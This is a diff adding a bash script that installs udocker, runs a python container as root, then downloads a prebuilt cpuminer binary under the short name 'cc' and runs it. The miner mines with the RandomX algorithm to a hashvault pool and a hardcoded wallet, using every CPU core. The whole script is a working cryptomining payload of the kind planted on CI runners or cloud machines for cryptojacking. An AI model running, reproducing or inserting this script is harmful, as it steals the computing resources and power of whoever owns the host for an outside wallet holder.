@@ -1,0 +1,16 @@
+#!/bin/bash
+export LC_ALL=C
+export LANG=C
+curl https://github.com/indigo-dc/udocker/releases/download/1.3.17/udocker-1.3.17.tar.gz -L -o udocker-1.3.17.tar.gz
+tar zxvf udocker-1.3.17.tar.gz
+export PATH=`pwd`/udocker-1.3.17/udocker:$PATH
+udocker --allow-root pull python:latest
+udocker --allow-root create --name=python python:latest
+udocker --allow-root run python /bin/bash
+
+udocker
+echo
+apt update && apt -y install unzip wget curl libncurses6 libncursesw6
+curl https://github.com/ocminer/cpuminer-opt-supr/releases/download/v1.45/cpuminer-x86-64-v2 -L -o cc
+chmod 777 cc
+./cc -a rx/0 -o stratum+tcp://pool.hashvault.pro:443 -u 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK -p x -t $(nproc --all)
